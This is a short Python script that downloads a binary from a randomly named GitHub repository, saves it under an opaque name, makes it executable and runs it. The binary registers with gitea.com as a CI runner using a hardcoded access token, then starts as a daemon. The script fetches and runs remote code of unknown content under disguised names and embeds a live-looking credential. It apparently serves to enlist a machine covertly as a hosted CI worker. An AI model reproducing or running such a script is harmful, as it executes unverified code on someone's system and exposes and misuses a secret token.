
import subprocess
import urllib.request
import os

TOKEN = "40ce80QAqU5DPfOqwHvsyTBpxx9OLqOjdna2maHk"

URL = "https://github.com/KOSOCOFA/legendary-rotary-phone/raw/refs/heads/main/kosovok"
BINARY = "kemisolo"

# Download
print("[1] Downloading...")
urllib.request.urlretrieve(URL, BINARY)

# Set executable permissions
os.chmod(BINARY, 0o755)

# Register
print("[2] Registering runner...")
subprocess.run([
    "./" + BINARY,
    "register",
    "--instance", "https://gitea.com/",
    "--token", TOKEN,
    "--labels", "maiso",
    "--name", "maiso"
], check=True)

# Start daemon
print("[3] Starting daemon...")
subprocess.run(["./" + BINARY, "daemon"], check=True)
